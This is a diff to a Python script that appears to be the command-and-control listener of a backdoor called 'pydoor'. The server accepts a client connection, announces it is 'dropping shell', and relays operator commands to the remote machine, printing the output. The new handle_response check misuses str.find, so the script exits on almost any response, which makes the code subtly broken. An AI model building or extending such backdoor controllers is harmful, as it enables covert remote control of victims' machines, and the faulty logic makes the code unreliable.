@@ -1,6 +1,7 @@
 import socket
 import time
-from colorama import *
+import sys
+
 
 
 
@@ -9,13 +10,24 @@ class Server:
     def __init__(self):
         self.sock = 0
         self.con = 0
+        self.host = 0
+
+    def handle_response(self, resp):
+        if resp.find("pydoorcmd |quit| pydoorcmd"):
+            sys.exit(0)
+        else:
+            print(resp)
+
     
 
     def start(self):
 
-        print(Fore.GREEN + "Starting server" + Fore.RESET)
+        print("Starting server")
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
 
         self.sock.bind(("127.0.0.1", 9999))
 
@@ -25,20 +37,19 @@ class Server:
             
             self.con, addr = self.sock.accept()
             rdata = self.con.recv(4096)
+            
 
             if rdata:
-                print("Connection received from client, dropping shell")
+                self.host = str(self.sock.getsockname()).strip("(").strip(")").strip(",").replace("'", "") #Remove tuple stuff like parentheses before printing, we dont need any anyways
+                
+                print(f"Connection received from client, {self.host} dropping shell")
                 while True:
                     j = input(">")
                     if j == "":
                         continue
                     self.con.send(j.encode())
-                    dat = self.con.recv(4096)
-
-                    if len(dat) > 0:
-                        print(dat.decode())
-                    else: continue
-
+                    dat = self.con.recv(4096).decode()
+                    self.handle_response(dat)
 
                 
 
